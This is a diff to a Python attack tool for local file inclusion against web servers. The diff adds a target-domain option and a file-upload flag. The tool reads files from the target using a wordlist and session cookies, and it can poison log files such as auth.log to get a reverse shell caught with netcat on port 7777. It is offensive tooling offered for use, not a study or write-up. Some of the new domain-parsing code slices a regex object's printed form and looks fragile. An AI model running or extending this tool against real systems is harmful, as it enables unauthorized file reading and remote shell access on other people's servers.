@@ -53,10 +53,17 @@ class Local_File_In():
                 print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
             else:
                 print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt")  
-            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
+            if self.args.Domain:
+               print("[+] Vulnrenable url     : ................ | : "+self.args.Domain)
+            else:   
+                print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
             print("[+] web Cookies         : ................ | : "+self.Cookie) 
+            if self.args.Domain:
+               self.args.Vulnurl = self.args.Domain
+            else:
+                pass   
             if self.args.auth and self.args.Vulnurl\
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl :
@@ -134,12 +141,18 @@ class Local_File_In():
                    exit()
           
         def url_request(self): 
-              
-            self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
-                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl)#).strip(   
+            if self.args.Domain:
+               domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
+               self.ip_re = (domain[-1][7:-2])
+               self.ip_re = self.ip_re[6:]
+            else:
+
+               self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
+                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl) 
+               self.ip_re = self.ip_re.group()
             try:           
-               if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
-                  os.makedirs('./FileStore/'+self.ip_re.group()+"/")
+               if not os.path.exists('./FileStore/'+self.ip_re+"/"):
+                  os.makedirs('./FileStore/'+self.ip_re+"/")
             except AttributeError as e:
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
@@ -237,7 +250,7 @@ class Local_File_In():
                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
-                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
+                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
                           +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
                          if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
@@ -247,7 +260,7 @@ class Local_File_In():
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
                                     print("[+] Mothead              : ................ | : enjaction log file  ")
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
                                     print("[+] Lisliner Port        : ................ | : 7777") 
                                     self.Reverse_shell()
                                     exit()
@@ -275,7 +288,7 @@ class Local_File_In():
                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
-                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
+                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
                           +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
                          if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
@@ -285,7 +298,7 @@ class Local_File_In():
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
                                     print("[+] Mothead              : ................ | : enjaction log file  ")
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
                                     print("[+] Lisliner Port        : ................ | : 7777") 
                                     self.Reverse_shell()
                                     exit()
@@ -332,19 +345,21 @@ class Local_File_In():
                                                       
         def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
-           parser.add_argument("-UV","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
-           parser.add_argument("--auth"               , action='store_true'                    ,help ="auth mautrd web") 
-           parser.add_argument("-F","--filelist"      , action=None                            ,help ="read fron lfi wordlsit ")
-           parser.add_argument("-C","--Cookie"        , action=None        ,required=True      ,help ="Login sesion Cookie")  
+           parser.add_argument("-UV","--Vulnurl"    , action=None         ,required=False    ,help ="url Targst web") 
+           parser.add_argument("--auth"             , action='store_true'                    ,help ="auth mautrd web") 
+           parser.add_argument("-F","--filelist"    , action=None                            ,help ="read fron lfi wordlsit ")
+           parser.add_argument("-C","--Cookie"      , action=None        ,required=True      ,help ="Login sesion Cookie")  
            parser.add_argument("-B","--base64"      , action='store_true'                    ,help ="decode filter php  base64")  
-           parser.add_argument("-R","--read"          , action=None                            ,help ="use to read file on the traget machine")  
-           parser.add_argument("-UF","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
-           parser.add_argument("-PF","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
+           parser.add_argument("-R","--read"        , action=None                            ,help ="use to read file on the traget machine")  
+           parser.add_argument("-UF","--UserForm"   , action=None                            ,help =" add name of the HTML Form Login User")
+           parser.add_argument("-PF","--PassForm"   , action=None                            ,help ="add name of the HTML Form Login Passord")
            parser.add_argument("-P","--password"    , action=None                            ,help ="use specific Passowrd")   
            parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
            parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
-           parser.add_argument("-A" ,"--aggress"       ,action='store_true'                     ,help ="  use aggressiv mode  ")
-           parser.add_argument( "-S", "--shell"       , action=None                            ,help ="  to connent reverseshell   ")
+           parser.add_argument("-A","--aggress"     ,action='store_true'                     ,help ="  use aggressiv mode  ")
+           parser.add_argument("-K","--upload"      ,action='store_true'                     ,help ="  use to upload file  to server")
+           parser.add_argument("-D","--Domain"      ,action=None                             ,help ="  use target url domain not as ip 'www.expiln.com'")
+           parser.add_argument("-S","--shell"       ,action=None                             ,help ="  to connent reverseshell   ")
            self.args = parser.parse_args()     
            if len(sys.argv)!=1 :
               pass
